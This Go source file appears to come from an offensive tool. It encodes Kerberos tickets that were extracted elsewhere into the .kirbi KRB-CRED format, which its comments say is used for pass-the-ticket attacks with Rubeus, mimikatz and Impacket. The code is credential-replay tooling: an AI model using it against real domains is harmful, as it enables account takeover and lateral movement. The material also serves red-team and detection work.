package commands

// Kerberos .kirbi serialization — encodes extracted tickets into the KRB-CRED
// format (RFC 4120 §5.8.1) used by Rubeus, mimikatz, and Impacket for
// pass-the-ticket attacks.
//
// KRB-CRED is [APPLICATION 22] SEQUENCE containing:
//   - pvno (INTEGER 5)
//   - msg-type (INTEGER 22)
//   - tickets (SEQUENCE OF Ticket — the raw Ticket from the KDC)
//   - enc-part (EncryptedData with etype=0, cipher=EncKrbCredPart)
//
// EncKrbCredPart is [APPLICATION 29] SEQUENCE containing:
//   - ticket-info (SEQUENCE OF KrbCredInfo)
//
// This is "unencrypted" KRB-CRED (etype=0, no actual encryption) — the
// standard format for kirbi files.
//
// DER encoding primitives (derWrap, derSequence, derOctetString) are defined
// in ticket_pkinit.go and reused here.

import (
	"encoding/binary"
	"fmt"
	"math/big"
	"time"
)

// buildKirbi constructs a .kirbi (KRB-CRED) blob from an extracted ticket.
func buildKirbi(ticket kerbTicket) ([]byte, error) {
	if len(ticket.TicketBytes) == 0 {
		return nil, fmt.Errorf("no raw ticket bytes available")
	}

	credInfo := kirbiCredInfo(ticket)
	encPart := kirbiEncKrbCredPart(credInfo)
	krbCred := kirbiKrbCred(ticket.TicketBytes, encPart)
	return krbCred, nil
}

// kirbiKrbCred constructs the top-level KRB-CRED structure.
// [APPLICATION 22] SEQUENCE {
//
//	pvno      [0] INTEGER (5)
//	msg-type  [1] INTEGER (22)
//	tickets   [2] SEQUENCE OF Ticket
//	enc-part  [3] EncryptedData
//
// }
func kirbiKrbCred(rawTicket []byte, encKrbCredPart []byte) []byte {
	pvno := kirbiExplicit(0, kirbiInt(5))
	msgType := kirbiExplicit(1, kirbiInt(22))
	tickets := kirbiExplicit(2, derSequence(rawTicket))
	encData := kirbiExplicit(3, kirbiEncryptedData(0, encKrbCredPart))

	return kirbiApp(22, derSequence(pvno, msgType, tickets, encData))
}

// kirbiEncKrbCredPart constructs the EncKrbCredPart structure.
// [APPLICATION 29] SEQUENCE {
//
//	ticket-info [0] SEQUENCE OF KrbCredInfo
//
// }
func kirbiEncKrbCredPart(krbCredInfo []byte) []byte {
	ticketInfo := kirbiExplicit(0, derSequence(krbCredInfo))
	return kirbiApp(29, derSequence(ticketInfo))
}

// kirbiCredInfo constructs a single KrbCredInfo entry.
func kirbiCredInfo(ticket kerbTicket) []byte {
	var parts []byte

	// [0] EncryptionKey
	encKey := derSequence(
		kirbiExplicit(0, kirbiInt(int(ticket.KeyType))),
		kirbiExplicit(1, derOctetString(ticket.KeyBytes)),
	)
	parts = append(parts, kirbiExplicit(0, encKey)...)

	// [1] prealm
	if ticket.DomainName != "" {
		parts = append(parts, kirbiExplicit(1, kirbiGeneralString(ticket.DomainName))...)
	}

	// [2] pname
	if ticket.ClientName != "" {
		parts = append(parts, kirbiExplicit(2, kirbiPrincipalName(1, ticket.ClientName))...)
	}

	// [3] flags
	parts = append(parts, kirbiExplicit(3, kirbiBitString32(ticket.TicketFlags))...)

	// [5] starttime
	if !ticket.StartTime.IsZero() {
		parts = append(parts, kirbiExplicit(5, kirbiTime(ticket.StartTime))...)
	}

	// [6] endtime
	if !ticket.EndTime.IsZero() {
		parts = append(parts, kirbiExplicit(6, kirbiTime(ticket.EndTime))...)
	}

	// [7] renew-till
	if !ticket.RenewUntil.IsZero() {
		parts = append(parts, kirbiExplicit(7, kirbiTime(ticket.RenewUntil))...)
	}

	// [8] srealm
	if ticket.TargetDomain != "" {
		parts = append(parts, kirbiExplicit(8, kirbiGeneralString(ticket.TargetDomain))...)
	} else if ticket.DomainName != "" {
		parts = append(parts, kirbiExplicit(8, kirbiGeneralString(ticket.DomainName))...)
	}

	// [9] sname
	if ticket.ServiceName != "" {
		parts = append(parts, kirbiExplicit(9, kirbiPrincipalName(2, ticket.ServiceName))...)
	}

	return derSequence(parts)
}

// kirbiEncryptedData constructs an EncryptedData structure.
func kirbiEncryptedData(etype int, plaintext []byte) []byte {
	return derSequence(
		kirbiExplicit(0, kirbiInt(etype)),
		kirbiExplicit(2, derOctetString(plaintext)),
	)
}

// kirbiPrincipalName constructs a PrincipalName from a slash-separated name.
func kirbiPrincipalName(nameType int, name string) []byte {
	parts := kirbiSplitName(name)
	var nameStrings []byte
	for _, p := range parts {
		nameStrings = append(nameStrings, kirbiGeneralString(p)...)
	}
	return derSequence(
		kirbiExplicit(0, kirbiInt(nameType)),
		kirbiExplicit(1, derSequence(nameStrings)),
	)
}

func kirbiSplitName(name string) []string {
	var parts []string
	current := ""
	for _, c := range name {
		if c == '/' {
			parts = append(parts, current)
			current = ""
		} else {
			current += string(c)
		}
	}
	parts = append(parts, current)
	return parts
}

// ---------------------------------------------------------------------------
// ASN.1 DER primitives (kirbi-prefixed to avoid collision with ticket_pkinit.go)
// ---------------------------------------------------------------------------

func kirbiInt(val int) []byte {
	if val == 0 {
		return derWrap(0x02, []byte{0})
	}
	b := big.NewInt(int64(val)).Bytes()
	if b[0]&0x80 != 0 {
		b = append([]byte{0}, b...)
	}
	return derWrap(0x02, b)
}

func kirbiGeneralString(s string) []byte {
	return derWrap(0x1B, []byte(s))
}

func kirbiTime(t time.Time) []byte {
	s := t.UTC().Format("20060102150405") + "Z"
	return derWrap(0x18, []byte(s))
}

func kirbiBitString32(flags uint32) []byte {
	b := make([]byte, 4)
	binary.BigEndian.PutUint32(b, flags)
	content := append([]byte{0}, b...) // 0 unused bits
	return derWrap(0x03, content)
}

func kirbiExplicit(tag int, content []byte) []byte {
	return derWrap(byte(0xA0|tag), content)
}

func kirbiApp(tag int, content []byte) []byte {
	return derWrap(byte(0x60|tag), content)
}
